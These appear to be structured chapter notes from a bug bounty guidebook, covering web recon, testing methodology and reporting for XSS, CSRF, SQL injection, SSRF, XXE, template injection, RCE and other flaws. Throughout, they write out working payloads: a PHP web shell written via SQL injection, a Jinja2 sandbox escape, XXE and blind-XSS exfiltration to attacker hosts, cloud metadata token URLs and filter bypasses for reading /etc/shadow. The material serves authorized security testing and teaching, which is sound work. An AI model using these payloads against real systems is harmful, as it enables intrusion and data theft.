source_book: Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities
author: Vickie Li

chapters.title: Picking a Bug Bounty Program
methodology: Identify which asset type fits your skill set: social sites, general web apps, mobile apps, APIs, source code/executables, hardware/IoT.
Decide between bug bounty platforms (HackerOne, Bugcrowd, Intigriti, Synack, Cobalt) and independently hosted programs (Google, Facebook, Apple, Medium).
Verify the program scope (in-scope vs out-of-scope assets and vulnerability types) before doing any recon.
Assess metrics: payout amounts (VDP vs paid), average response time, triage time, average bounty.
Aim to get into private programs by submitting valid high-impact bugs, completing CTFs/tutorials on the platform, and avoiding low-quality spam.
For beginners, prefer programs with large scope, fast response times, and vulnerability disclosure programs (less competition).
escalation_impact_tips: Submit high-impact vulnerabilities first to earn reputation faster and unlock private invites.
Don't spam—negative reputation prevents private invites.
Be polite and professional with security teams.

chapters.title: Sustaining Your Success
methodology: Step 1: Craft a descriptive title that states the vulnerability class, location, and impact in one sentence.
Step 2: Provide a clear summary covering what the bug is, where it is, and what an attacker can do.
Step 3: Include a severity assessment (Low/Medium/High/Critical) using CVSS or platform calculators.
Step 4: Give step-by-step reproduction steps assuming the reader has no prior knowledge.
Step 5: Provide a Proof of Concept (HTML file, video, screenshots, crafted URL, upload payload).
Step 6: Describe impact and realistic attack scenarios — separate from severity.
Step 7: Recommend possible mitigations only if you understand the root cause.
Step 8: Validate the report — re-run your own steps and check POC files.
escalation_impact_tips: Chain low-severity bugs (open redirect + SSRF; self-XSS + CSRF) before reporting.
Don't report low-impact or out-of-scope bugs as-is — escalate or hold.
Tailor severity to the client company's business priorities (e.g., birth date leak matters for a job site, not a dating site).
report_template_hints: Title format: '<Vuln class> on <URL/endpoint> leads to <impact>'.
Summary: state endpoint, parameters, root cause, impact in one paragraph.
Severity line: 'Severity of the issue: High'.
Reproduction: numbered steps that assume two accounts and full setup.
POC: attach HTML/video/screenshots/curl commands.
Impact: realistic worst-case scenario, no hypotheticals.
Mitigation: high-level direction (e.g., 'validate user_id on server side and reject mismatched requests').
No leetspeak, jokes, or memes; conversational but professional tone.

chapters.title: How the Internet Works
chapters.topic: Web fundamentals: client-server, DNS, ports, HTTP, sessions, tokens, JWTs, SOP
methodology: Understand client-server model, DNS resolution (A/AAAA), and the role of ports (80/443).
Learn HTTP request methods (GET, POST, PUT, DELETE, PATCH, OPTIONS) and status codes (1xx-5xx).
Understand session cookies vs token-based auth (JWTs) and how the browser auto-attaches cookies.
Learn the Same-Origin Policy: two URLs share an origin only if protocol + host + port match.
Note common HTTP headers (Host, Cookie, Set-Cookie, Authorization, Referer, Content-Type, X-Powered-By).

chapters.title: Environmental Setup and Traffic Interception
methodology: Install Firefox and Burp Suite Community/Pro; configure Firefox to use 127.0.0.1:8080 as proxy or use Burp's embedded browser.
Visit http://burp/ to download Burp's CA certificate and install it under Firefox certificate authorities (trust to identify websites).
Turn on Intercept in Burp Proxy and verify by visiting https://www.google.com/.

Use Burp modules: Proxy (intercept/modify), Intruder (automated attacks with payload positions), Repeater (manual single-request testing), Decoder (encode/decode), Comparer (diff two requests/responses).
Save requests via 'Copy URL', 'Copy as curl command', or 'Copy to file'.
Build organized plaintext notes per target (Sublime Text/Obsidian/XMind) with sub-folders for endpoints, features, recon, drafts, POCs.

chapters.title: Web Hacking Reconnaissance
chapters.topic: Recon: scope discovery, subdomains, service enum, directory brute-forcing, spidering, third-party hosting, GitHub, OSINT, fingerprinting, automation, scheduling
methodology: Manually walk the target: sign up at every privilege level and click every feature to enumerate the attack surface.

Google dorking with operators: site:, inurl:, intitle:, link:, filetype:, * (wildcard), quotes, | (or), - (minus). Examples: 'site:*.example.com', 'site:example.com inurl:app/kibana', 'site:s3.amazonaws.com COMPANY', 'site:example.com ext:log/php/txt password'. Use Google Hacking Database for prebuilt queries.
Scope discovery — WHOIS and reverse WHOIS: 'whois facebook.com', ViewDNS.info reverse WHOIS.
IP addresses: nslookup to resolve, ViewDNS reverse IP for co-hosted domains, whois on IP to find NetRange, whois -h whois.cymru.com IP to map IP to ASN and discover dedicated IP ranges.
Certificate parsing: crt.sh, Censys, Cert Spotter. Use https://crt.sh/?q=DOMAIN&output=json to grab Subject Alternative Names in JSON.

Subdomain enumeration: Sublist3r, SubBrute, Amass, Gobuster (dns mode: 'gobuster dns -d domain -w wordlist'). Feed SecLists or Commonspeak2 wordlists. Use Altdns for permutations. Recurse on found subdomains to discover sub-subdomains.
Service enumeration: active with Nmap ('nmap target', '-sV' for version detection) or Masscan; passive via Shodan, Censys, Project Sonar.
Directory brute-forcing: Dirsearch ('./dirsearch.py -u host -e php'), Gobuster dir mode ('gobuster dir -u url -w wordlist'). Inspect 200/301/403 responses; 403 may be bypassable.
Screenshot enumerated paths/subdomains with EyeWitness or Snapper.
Spider the site with OWASP ZAP Spider (Tools > Spider) or Burp Crawler to discover hidden endpoints.

Third-party hosting (S3 buckets): Google-dork 'site:s3.amazonaws.com COMPANY', search GitHub repos for 's3', use GrayhatWarfare, brute-force with Lazys3 or Bucket Stream. Test access with 'aws s3 ls/cp/rm s3://BUCKET/'.

GitHub recon: find org/employee usernames; review repos' Issues, Commits, Code, Blame, History. Grep for key, secret, password, api_key. Validate creds with KeyHacks. Automate with Gitrob and TruffleHog.
OSINT: engineering job posts (tech stack), LinkedIn, Stack Overflow, employee blogs, Pastebin (PasteHunter), SlideShare, employees' Google calendars, Wayback Machine + Waybackurls.

Tech stack fingerprinting: 'nmap -sV', inspect Server / X-Powered-By / X-Generator / Set-Cookie (PHPSESSID, etc.) headers, view HTML source for 'powered by', use Wappalyzer, BuiltWith, StackShare, Retire.js. Search CVE database for found versions.

Write bash recon scripts: shebang, parse $1..$@, redirect output (>, >>, |), command substitution $(...), conditionals (if/elif/fi), case statements, for/while loops, getopts for flags, source for libraries, functions, test conditions ([-f], [-d], -eq/-ne/-gt/-lt, -z/-n, &&/||).
Parse outputs: grep -E with regex for filtering Nmap, jq -r '.[] | .name_value' for crt.sh JSON, cat to merge into a master report.
Schedule recurring scans via cron ('30 21 * * * ./scan.sh'), git diff to detect new endpoints/subdomains, push results to GitHub for change-notification emails.
Leverage recon APIs (Shodan, LinkedIn, Censys, BuiltWith, Google, GitHub) for programmatic queries. Manage API keys via lanmaster53/recon-ng-marketplace.
escalation_impact_tips: Use recon results to prioritize sensitive features (payments, password reset, file uploads) where critical bugs (IDOR, RCE) live.
Match found tech stack against the CVE database to find pre-disclosed vulns.
Continuous recon (cron + git diff) is the fastest way to find new endpoints before other hunters.

chapters.title: Cross-Site Scripting
methodology: Step 1: Look for input opportunities — for stored XSS scan comment fields, profiles, posts, usernames; for reflected/DOM look at URL params, fragments, pathnames. Don't ignore drop-downs or numeric fields — intercept and modify in Burp Proxy.
Insert a unique marker like 'XSS_BY_VICKIE' into every parameter and View Source on the response to find where input lands.

Step 2: Insert payloads — start with ; escalate to event-handler payloads (, , ); use javascript: and data:text/html;base64,... URLs when input feeds into an href/src; close out existing tags ('"/>') as needed.
Try an XSS polyglot (e.g. EdOverflow's polyglot.innerht.ml) that fires in multiple contexts.
Use a generic test string like >'<"//:=;!-- to discover which characters are escaped, then build a context-specific payload.
For blind XSS: deliver <script src='http://YOUR_SERVER/xss'></script> and monitor server logs (or use XSS Hunter).
Step 3: Confirm impact — verify alert/pop-up, redirect, cookie exfiltration. Watch for delayed execution in logs, emails, exports, admin pages.
tools_and_payloads: OWASP XSS filter evasion cheat sheet
bypass_techniques: Alternative JS syntax: use event handlers in attributes (onerror, onload, onclick, onmouseover) instead of <script>.
Use javascript: and data: URL schemes when input lands in href/src.
Mixed-case to bypass case-sensitive blocklists: <scrIPT>...</scrIPT>.
Use String.fromCharCode(...) to construct payload strings without quotes.
Exploit single-pass replace filters by nesting tags: <scrip<script>t>...</scrip</script>t>.
Encode payloads (URL, double-URL, HTML, base64) when filters look for literal strings.
Test across multiple browsers — tags/handlers differ.
escalation_impact_tips: Stored XSS on public pages = highest impact; DOM/reflected requires victim click; self-XSS usually not in scope.
Steal CSRF tokens / session cookies via document.cookie or DOM scrape and exfiltrate to attacker server.
Use XSS to bypass CSRF (script can read tokens, then fire XMLHttpRequest).
Replace the page content with a fake login (phishing) or trigger forced redirects/malware downloads.
Target admin/staff pages (server logs, support tickets) for full app compromise — chain to RCE via shell upload.
report_template_hints: Title: 'Stored/Reflected/DOM XSS on <URL> via <parameter>'.
Provide the exact payload, the resulting HTML, and a screenshot/video of the alert or cookie exfiltration.
If chained, document the chain (e.g., XSS -> cookie theft -> account takeover).

chapters.title: Open Redirects
methodology: Step 1: Look for redirect parameters by browsing with a proxy: redirect, redir, next, u, n, forward, RelayState, return, returnurl, dest, destination, url, uri.
Note pages with 301/302 responses that auto-redirect without a URL parameter — these are candidates for referer-based redirects.

Step 2: Google dork for redirect params: 'inurl:%3Dhttp site:target' (URL-encoded =http), 'inurl:%3D%2F site:target' (relative URLs), 'inurl:redir site:target', and variants for redirect/redirecturi/return/forward/relaystate.

Step 3: Test parameter-based redirects by inserting your own hostname (http://attacker.com or http://google.com) and observing whether the application redirects offsite; some only redirect after login/logout/registration.
Step 4: Test referer-based redirects by hosting an HTML page with link; click through and see if you're sent to your domain afterward.
bypass_techniques: Browser autocorrect: 'https:attacker.com', 'https;attacker.com', 'https:\\/\\/attacker.com', 'https:/\\/\\attacker.com', 'https:\\\\example.com'.
Backslash trick: 'https://attacker.com\\@example.com' — validators may treat attacker.com\\ as username; Chrome rewrites \\ to /.

Flawed validator logic: domain in subdomain ('http://example.com.attacker.com'), in path ('http://attacker.com/example.com'), userinfo ('https://example.com@attacker.com'), or both ('https://example.com.attacker.com/example.com').
Use data: URL scheme: 'data:text/html;base64,<base64 of <script>location=...</script>>'.
URL-encoding tricks: 'https://example.com%2f@attacker.com', '%252f' (double), '%25252f' (triple) — mismatches between validator and browser decoding.
Non-ASCII characters that browsers normalize: 'https://attacker.com%ff.example.com' (ÿ becomes ? or is stripped), look-alike slash '╱' (%E2%95%B1) -> /, Cyrillic look-alikes from Unicode chart.
Combine: 'https://example.com%252f@attacker.com/example.com'.
escalation_impact_tips: Chain into phishing by hosting a fake login on attacker.com that mirrors the target.
Use open redirect to bypass URL allowlists in SSRF.
Smuggle OAuth tokens / access_token via Referer or URL fragment to attacker.com (key for SSO bypass, see Ch 20).
Bare open redirects are often dismissed — escalate by chaining.
report_template_hints: Provide a single click-through URL that demonstrates the redirect.
Mention the chained impact (phishing, OAuth token theft, SSRF bypass) to justify severity.

chapters.title: Clickjacking
methodology: Step 1: Map state-changing actions on the target that can be triggered by clicks alone (password change, fund transfer, unlink account, deactivate account, change billing email).
Step 2: Check response headers on those pages for X-Frame-Options (DENY/SAMEORIGIN), Content-Security-Policy frame-ancestors, and SameSite cookie flags.
Build a test HTML page: <iframe src='TARGET_URL' width=500 height=500></iframe>; if the iframe renders, the page is frameable.

Step 3: Confirm exploit by overlaying the iframe (opacity:0.00001, z-index:1) on top of a decoy element (z-index:-1, position:absolute) with a fake-button label and trigger the click yourself on a test account.
tools_and_payloads: Custom HTML iframe + CSS overlay (opacity, z-index, position:absolute)
bypass_techniques: Frame-busting JS that only compares top.location to self.location can be defeated with a double-iframe: attacker -> victim-domain page that frames victim target. Both top and self resolve to victim domain.
X-Frame-Options ALLOW-FROM is obsolete in modern Chrome/Firefox/Safari — pages relying on it are exploitable in those browsers (e.g., Periscope 2019).
escalation_impact_tips: Place the hidden button on top of a 'Please accept cookies!' prompt or similar must-click element.
Chain multiple clickjackings: first change billing email, then export account data to the attacker's email.
Many programs explicitly exclude clickjacking — read scope; demonstrate impactful state-changes (password reset, account deletion) to justify acceptance.
report_template_hints: Attach a working HTML POC file.
Record the click sequence on video.
Highlight a sensitive state-changing action; trivial clickjacking is usually rejected.

chapters.title: Cross-Site Request Forgery
methodology: Test in a browser that does NOT default to SameSite=Lax (Firefox/Safari/IE) since Chrome 2020+ auto-mitigates classic POST CSRF.
Step 1: Map state-changing endpoints (password change, send email, delete content, change billing) by browsing with Burp; record method, URL, and parameters.
Step 2: Look at each request for CSRF protection: search for csrf, state, token in body, headers, cookies; check SameSite flag on session cookies.
Step 3: Craft an HTML POC form that auto-submits to the target and load it in a browser logged into the victim account; confirm state change.
tools_and_payloads: Burp Suite Pro / ZAP CSRF POC generator
Custom HTML form with JS auto-submit (document.getElementById('csrf-form').submit())
bypass_techniques: Exploit clickjacking on the same endpoint when CSRF token is in place but framing isn't blocked.
Switch request method (POST <-> GET, PUT, DELETE) — protection often differs per method.
Delete the token parameter entirely or send a blank token (server-side code that only validates if token exists).
Submit your own valid token instead of the victim's (server checks 'is this a known token?' but not 'does it belong to this user?').
Double-submit token bypass via session fixation (force a known csrf_token cookie on the victim, then submit matching body token).
Bypass Referer check by removing the header (<meta name="referrer" content="no-referrer">) or by hosting on attacker subdomain 'example.com.attacker.com' or path 'attacker.com/example.com'.
Use XSS on any page to grab the legit token and fire XMLHttpRequest.
escalation_impact_tips: CSRF on change-billing-email -> redirect monthly statements to attacker (info disclosure).
CSRF + Self-XSS -> Stored XSS (POST to nickname/profile field that's only editable by self).
CSRF on /set_password for social-login users who never set a password -> full account takeover.
Deliver via a malicious post on a forum (forum.example.com), an for one-click attacks, or via stored XSS that injects an auto-submitting form.
report_template_hints: Provide a self-contained HTML file POC.
Use Burp Pro 'Generate CSRF PoC' if available.
Always include impact (account takeover, info leak, money transfer).

chapters.title: Insecure Direct Object References
methodology: Step 1: Create two accounts at each privilege level (attacker + victim, premium + free, admin + user, plus unauthenticated session).
Step 2: Discover features that read or modify user data: profile reads, file uploads, message endpoints, group/team pages, settings changes.

Step 3: Intercept all requests with Burp while using the high-privileged account. Use two browsers (Firefox + Chrome) — one per account — and modify requests from one while watching effects on the other.
Step 4: Switch out IDs in URL params, body params, headers, paths, cookies, and filenames; observe whether you can read or modify the other account's resources.
Look in REST and GraphQL endpoints (often vulnerable) — see Ch 24.
tools_and_payloads: Burp Decoder (Smart Decode for encoded IDs)
Burp extensions: Autorize (Quitten/Autorize), Auto Repeater (nccgroup), AuthMatrix (SecurityInnovation)
bypass_techniques: Decode encoded IDs: base64, base64url, URL-encoding, hex, octal — use Smart Decode.
Predict hashed/random IDs by analyzing entropy or creating multiple accounts to spot patterns.
Find ID leaks via other API endpoints (e.g., profile page exposes user_id then conversation_id can be fetched).
Add an ID parameter when the endpoint doesn't include one (e.g., '/api_v1/messages?user_id=ANOTHER').
Look for blind IDORs that leak via email, exports, or text alerts (e.g., POST /get_receipt receipt_id=...).
Change request method (GET, POST, PUT, DELETE, PATCH) — auth often differs per method.
Change file type / append '.json' to bypass per-type access checks.
escalation_impact_tips: Write-based IDORs on password reset / account recovery / admin endpoints = critical (mass account takeover, RCE).
Read-based IDORs on PII, DMs, financial info = high.
Chain with self-XSS for stored XSS, with username enumeration for mass takeover, with admin write for RCE.
Monitor exports/emails/alerts over weeks — blind IDORs can leak data months later.
report_template_hints: Show two-account demo: request A with attacker's session reading/modifying victim's resource.
Document the encoded/decoded ID, request method, parameter location.

chapters.title: SQL Injection
chapters.vulnerability_class: SQL injection (classic UNION-based, error-based, blind boolean, blind time-based, second-order, NoSQL)
methodology: General detection: insert a single quote (') in every user-input field and watch for DB errors / response anomalies.
Fuzz with SQLi payloads against every parameter (URL, body, headers, cookies). See Ch 25.
Step 1: Look for classic SQLi — try UNION-based ('UNION SELECT Username,Password FROM Users;--') and error-based (CONVERT() to a date type in MySQL leaks values in error messages).

Step 2: Look for blind SQLi — Boolean-based (substring + visible UI delta: '2\' UNION SELECT Id FROM Users WHERE Username=\'admin\' AND SUBSTR(Password,1,1)=\'a\';--') and time-based ('IF(SUBSTR(...)=\'a\', SLEEP(10), 0)').

Step 3: Exfiltrate via SELECT ... INTO OUTFILE '/var/www/html/output.txt' for second-order or when no direct output. Also good for detecting second-order injections (input stored then later used unsafely).
Step 4: Look for NoSQL injection (MongoDB): supply '{$ne: ""}' as a password to bypass auth; abuse $where/mapReduce/$accumulator/$function with raw JS.
Learn the DB: fingerprint version (@@version on MySQL/MSSQL, version() on PostgreSQL, v$version on Oracle), then query information_schema.tables/columns to enumerate.
tools_and_payloads: Damn Vulnerable Web Application (dvwa.co.uk) for practice
<? system($_REQUEST['cmd']); ?> INTO OUTFILE '/var/www/html/shell.php' for web shell upload
bypass_techniques: URL-encode / double-URL-encode special chars to slip past WAFs.
Mixed-case keywords (SeLeCt), inline comments (SEL/**/ECT), null bytes.
Use OR-based injection variants when AND is filtered.
Use HTTP parameter pollution to split payload across same-name params.
escalation_impact_tips: Read /etc/passwd or system tables, leak app source code.
Gain a web shell via SELECT '<?php system($_REQUEST[cmd]);?>' INTO OUTFILE to web root, then call shell.php?cmd=....
Authentication bypass and arbitrary password change via UPDATE injections.
DoS via Mongo $where loop {while(true){}}.
report_template_hints: Provide a clean, reproducible payload and an exact HTTP request.
Don't dump customer data — prove with version() or current_user(); use SLEEP for blind.
Note 'sqlmap --batch' can confirm and exploit; share the command, not the dump.

chapters.title: Race Conditions
methodology: Step 1: Find features that should be allowed once but might be repeatable: bank transfers, gift card redemption, online votes, score updates, e-commerce payments, password reset, MFA code use.
Copy the critical request from Burp ('Copy as curl command').
Step 2: Fire multiple simultaneous requests using shell: 'curl ... & curl ... & curl ... & curl ...'. The '&' background operator runs them in parallel.
Step 3: Check the resulting state (account balance, vote count, redemption status). If totals exceed what the limit allows, race condition confirmed.
Step 4: Build a POC with explicit setup steps (2 accounts, starting balance) and a curl one-liner; note that success depends on scheduling and may need several attempts.
tools_and_payloads: Burp Repeater (group send / send-in-parallel in newer versions)
bypass_techniques: Increase concurrency: more parallel curls (8-50) and run multiple times because success is probabilistic.
escalation_impact_tips: Pick highest-impact features: cash withdrawal, fund transfer, credit card payment, coupon redemption -> infinite financial value.
Chain with vote/score systems for reputation manipulation.
Race conditions can also bypass access control (e.g., race a permission revocation).
report_template_hints: Number the setup steps (create both accounts, fund attacker, etc.).
Provide the literal curl-with-& command.
Tell the reader to retry if the first run doesn't trip the race.

chapters.title: Server-Side Request Forgery
methodology: Step 1: Spot SSRF-prone features: webhooks, file upload from URL, image/document processors, link unfurling/thumbnails, proxy services, hidden API endpoints that take URLs, URLs embedded in uploaded files (XML/PDF).
Step 2: Send internal addresses to those endpoints: localhost, 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, IPv6 ::1, fc00::, and Wikipedia 'reserved IP addresses' for more.
Step 3: Check the response for service banners (port 22 -> OpenSSH banner in error), internal page content, status code differences (200 vs 500), or timing differences.
For blind SSRF, set up an out-of-band listener: Netcat ('nc -lp 8080'), a server on GoDaddy/Hostinger with access logs, or Burp Collaborator. Submit listener URL and watch logs.
Probe ports (22, 80, 443 vs 11) and compare server behavior (HTTP code, response time) to map internal services.
tools_and_payloads: GCP metadata v1beta1: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token (no Metadata-Flavor header needed)
bypass_techniques: Bypass allowlist via an open redirect on an allowlisted domain ('pics.example.com/123?redirect=127.0.0.1').
Weak regex allowlists: use userinfo trick 'https://pics.example.com@127.0.0.1' or path trick 'https://127.0.0.1/pics.example.com'.
Bypass blocklist with a redirector you control: host '<?php header("location: http://127.0.0.1"); ?>' on attacker.com/ssrf and submit attacker.com/ssrf as the URL.
Use IPv6: ::1, fc00:: when only IPv4 is blocked.
DNS trick: set A/AAAA record on a domain you own to 127.0.0.1, then submit that domain.
Switch encodings: hex (0x7f.0x0.0x0.0x1), octal (0177.0.0.01), dword (2130706433), URL-encoded ('%6c%6f%63%61%6c%68%6f%73%74' = localhost), or mix them ('0177.0.0.0x1').
Bypass Google's required Metadata-Flavor header by using v1beta1 endpoints that don't require it.
escalation_impact_tips: Network scanning: feed range of internal IPs, compare error messages to map live hosts.
Port scanning: same idea, vary the port — fingerprint Apache/Ubuntu via the banner in error message.
Pull cloud instance metadata (AWS IAM tokens, S3 creds, SSH keys via GCP) -> often direct credential theft.
Access internal admin panels and internal APIs that trust internal IPs.
Pivot stolen creds into S3 enumeration / private RDS / shell on web server.
Blind SSRF: network/port scanning via HTTP status code and response time deltas (Burp Repeater shows ms in bottom-right).
report_template_hints: Document the exact endpoint, parameter, and payload that produced the metadata/banner.
Quote the leaked banner or metadata snippet (redact long tokens).
Map at least 1-2 reachable internal hosts/ports to prove network impact.

chapters.title: Insecure Deserialization
methodology: Recognize serialized objects: PHP 'O:4:"User":2:{s:8:"username";...}'; Java starts with hex 'AC ED 00 05' or base64 'rO0' or Content-Type application/x-java-serialized-object; Python pickle often base64.
Look for serialized blobs in cookies, body params, headers, auth tokens, files; decode base64/URL when needed.
If you can edit serialized fields safely (no signing/encryption), tamper with role/username/status (e.g., 'not admin' -> 'admin') and re-serialize, adjusting length markers.

For RCE via PHP, look at __wakeup() / __destruct() / __toString() / __call() magic methods in the codebase. If a class is reachable that runs eval() or system() on a controllable property, instantiate it.
Build POP chains when no single class is exploitable: instantiate Class A whose __wakeup() calls Class B's method on a controllable property, chaining gadgets in the application's codebase.
Java: use Ysoserial gadget chains in popular libs (Apache Commons-Collections, Spring, Groovy, Commons FileUpload). Command: 'java -jar ysoserial.jar CommonsCollections1 "command"'.
bypass_techniques: Patch the serialized string directly, adjusting the length prefix (s:5:"admin" vs s:9:"not admin").
URL-encode the serialized payload when injecting via a cookie.
When the app blocks a specific class, use any other class in scope (or a third-party lib) with usable gadgets.
escalation_impact_tips: RCE via __wakeup -> eval, or full POP chains for PHP.
Java RCE via ysoserial-generated payloads opens calc.exe / reverse shells.
SQL injection via POP chain when a class's getValue() builds SQL from a property.
Authentication bypass by tampering identity fields when the object is the session token.
Half of disclosed deserialization vulns are PHP and most resolve as Critical.
report_template_hints: Include the raw and re-encoded serialized blob.
Provide a generator script (small PHP/Java snippet) that produced the payload.
Use a harmless test (phpinfo(), 'touch /tmp/test_<name>.txt') as POC, never a destructive command.

chapters.title: XML External Entity
methodology: Step 1: Find XML entry points — search HTTP messages for '<?xml' or tree-like tags; decode base64 (LD94bWw == '<?xml') to spot encoded XML. Also look at uploads of XML, DOCX, PPTX, XLSX, GPX, PDF, SVG, RSS, GIF/PNG/JPEG metadata. Try forcing 'Content-Type: text/xml' / 'application/xml' on endpoints that normally take JSON.

Step 2: Classic XXE — submit '<!DOCTYPE example [<!ENTITY test SYSTEM "file:///etc/hostname">]><example>&test;</example>' and see if the file content is reflected. Fall back to PUBLIC keyword if SYSTEM blocked.
Try standard files: /etc/hostname, /etc/passwd, ~/.bash_history.
Step 3: Blind XXE — set up an OOB listener (see Ch 13) and have the XML parser fetch '<!ENTITY test SYSTEM "http://attacker:80/xxe_test.txt">'. Try ports 80/443 first.

Step 4: Embed payloads in alt file types: SVG (add DTD + reference &test; in <text>), DOCX/PPTX/XLSX (unzip, edit /word/document.xml or /ppt/presentation.xml or /xl/workbook.xml, repack with 'zip -r').
Step 5: XInclude attack when you only control a single value: '<example xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></example>'.
bypass_techniques: Use PUBLIC keyword when SYSTEM is blocked.
For files with special chars use CDATA wrapper inside parameter entities or PHP base64 filter to safely encode contents.
Use FTP exfil (ftp://attacker:2121/?%file;) to avoid HTTP URL length / special-char restrictions.

Parameter entities + external DTD: host an external DTD (xxe.dtd) on your server with dynamic ENTITY declarations using % for %, then have target fetch it via '<!ENTITY % xxe SYSTEM "http://attacker/xxe.dtd"> %xxe;'.
Error-based exfil: reference a nonexistent file with the data in the path -> 'java.io.FileNotFoundException: file:///nonexistent/FILE_CONTENTS' leaks contents in the error message.
escalation_impact_tips: Read local files (/etc/shadow, source code, configs).
Launch SSRF: '<!ENTITY file SYSTEM "http://10.0.0.1:80">' for port scanning; AWS metadata via 169.254.169.254/latest/meta-data/.
Blind XXE: use parameter entities in external DTD to exfil via attacker URL.
DoS via 'billion laughs' (nested entity expansion) — NEVER test on live target; usually out of scope.
Inspect View Source / raw HTTP response for exfiltrated data (browser may not render it).
report_template_hints: Include the exact XML payload and the file you retrieved.
Use a non-sensitive file (/etc/hostname) first, escalate to a more impactful one only with permission.
If blind, include access-log entries from your listener showing the inbound request.

chapters.title: Template Injection
methodology: Step 1: Locate user input that ends up rendered back to the user (same surface as XSS): URL params, headers, body, file uploads, profile fields, bulk-email templates.
Step 2: Detect with an error-inducing payload: '{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]'. Errors that mention 'jinja2', 'Twig', 'FreeMarker', etc., are a giveaway.
Try math probes: '{{7*7}}' (Jinja2/Twig/Smarty), '${7*7}' (FreeMarker/Thymeleaf/Mako), '<%= 7*7 %>' (ERB). If 49 is returned, SSTI confirmed.
Distinguish Jinja2 vs Twig: '{{7*"7"}}' returns 7777777 in Jinja2, 49 in Twig.
When input is already inside expression tags '{{...}}' just provide '7*7' and look for 49.
Step 3: Determine the engine — error messages, or differential probes above.

Step 4: Escalate to RCE. In Jinja2/Python:
'{% for x in [].__class__.__bases__[0].__subclasses__() %}{% if "catch_warnings" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").system("ls")}}{%endif%}{%endfor%}'.
POC: use 'touch template_injection_by_<name>.txt' rather than a destructive command.
tools_and_payloads: tplmap (epinna/tplmap) for automated SSTI detection and exploitation
Sandbox-escape references: CTF Wiki, HackTricks, Programmer Help articles
bypass_techniques: When import is blocked, use __subclasses__() to reach catch_warnings -> _module -> __builtins__ -> __import__.
Concatenate / hex-encode function names to slip past blocklists (similar to RCE tricks in Ch 18).
Loop over subclasses and filter by name to find usable gadget classes.
escalation_impact_tips: RCE -> read /etc/passwd, /etc/shadow, exfiltrate source/config, escalate privileges, pivot to internal network.
Each engine has its own escalation path — read engine + language docs.
report_template_hints: Show the engine identification probe and the math result.
Use the harmless 'touch <unique>.txt' POC, not 'rm' or reverse shells.
Cite specific Jinja2 sandbox escape chain.

chapters.title: Application Logic Errors and Broken Access Control
chapters.vulnerability_class: Application Logic / Broken Access Control / Directory Traversal
chapters.topic: Application Logic Errors and Broken Access Control
methodology: Step 1: Learn the target — read engineering blogs, docs, browse as a regular user, note new features and integrations (they're least tested).
Step 2: Intercept every request during sensitive flows (MFA, checkout, password reset, admin panel) and document parameters and headers.

Step 3: Think outside the box — skip auth steps (jump directly to /security_questions/ after only password), mix payment-mode params ('saved_card=1' + fake 'card_number'), force-browse to /admin/dashboard.php after auth gate, add 'admin=1' cookie, tamper with predictable cookies/headers.
Hunt directory traversal: insert '../' (and encoded forms '%2e%2e%2f', '%252e%252e%255f', '..%2f') into file params; aim for /etc/shadow, /etc/passwd, source files, config files.
Look for exposed admin panels behind obscure URLs (find via Google dorks, /wp-admin/admin.php, /admin/, internal-only IP trust).
bypass_techniques: Add internal-only headers (X-Forwarded-For: 127.0.0.1, X-Real-IP) when admin panel trusts internal IPs.
Force browsing past auth pages (auth only on /login, not on /dashboard).
Different access points (mobile vs web vs API) often have inconsistent auth — try the same action from each.
escalation_impact_tips: Broken access control on admin panel with console/deploy capability -> RCE.
Config file leaks -> CVE-able software versions or credentials.
Chain logic errors with other classes (e.g., reach an internal endpoint that has SQLi).
report_template_hints: Walk through the user flow that should occur vs the abusive flow.
Communicate business impact (free goods, account takeover, leaked data).
Use creativity in attack scenarios — these bugs are not scannable.

chapters.title: Remote Code Execution
chapters.vulnerability_class: RCE (code injection, command injection, file inclusion)
methodology: Step 1: Recon target's tech stack (Ch 5) — RCE techniques are language/framework-specific.
Step 2: Identify suspicious user-input locations: every URL/body/header/file-upload field; any param used to construct filepaths.

Step 3: Submit test payloads.
Python: 'print("RCE test!")', '__import__("os").system("ls")', '__import__("os").system("sleep 10")'.
PHP: 'phpinfo();', '<?php system("ls");?>', '<?php system("sleep 10");?>'.
Unix command injection: ';ls;', '| sleep 10;', '& sleep 10;', '` sleep 10;`', '$(sleep 10)'.
RFI: '?page=http://attacker.com/malicious.php', '?page=http:attacker.com/malicious.php'.
LFI: '?page=../uploads/malicious.php', '?page=..%2fuploads%2fmalicious.php'.
Step 4: Confirm with harmless commands: 'whoami', 'ls', 'sleep 5', or 'cat /etc/passwd'. For POC, run 'touch rce_by_<name>.txt'.
For blind RCE, use timing (sleep 5) or OOB callbacks (DNS/HTTP listener).
tools_and_payloads: wget for downloading remote shells when wget is reachable from server
bypass_techniques: Unix: insert quotes/double-quotes ('/e'tc'/shadow'), wildcards (/etc/sh*dow), or empty substitutions (/etc/sha``dow, /etc/sha$()dow, /etc/sha${}dow).
PHP: function-name concatenation ('sys'.'tem')('cat /etc/shadow'); inline comment 'system/**/("ls");'; hex-encoded function names '\x73\x79\x73\x74\x65\x6d'("ls");.
Python: '__import__("o"+"s").system("...")', '__import__("\\x6f\\x73").system("...")'.
HTTP parameter pollution / multi-value concatenation: split 'system' across two same-name params if the server concatenates them.
Encoding variations: URL, double-URL, hex, mixed case, null bytes, newline injection.
escalation_impact_tips: Classic RCE POC: 'whoami', 'ls', 'cat /etc/passwd', 'touch rce_by_<name>.txt'.
Blind RCE POC: 'sleep 5' or out-of-band DNS/HTTP callback.
Reverse shell is often out of scope — get explicit permission first.
Be extra careful with production data; don't run privilege escalation in a bug bounty context.
report_template_hints: Specify the exact payload and parameter.
Demo with a harmless command and create a uniquely named file.
Don't dump customer data or modify configs.

chapters.title: Same-Origin Policy Vulnerabilities
chapters.vulnerability_class: SOP bypass (CORS misconfig, postMessage abuse, JSONP, XSS-as-SOP-bypass)
methodology: Step 1: Identify SOP relaxation in use. CORS: look for Access-Control-Allow-Origin response headers. postMessage: open DevTools -> Inspect -> Event Listeners and look for 'message' listeners. JSONP: look for <script src=".../?callback=..."> or '?jsonp=...'. Also check for document.domain assignments.

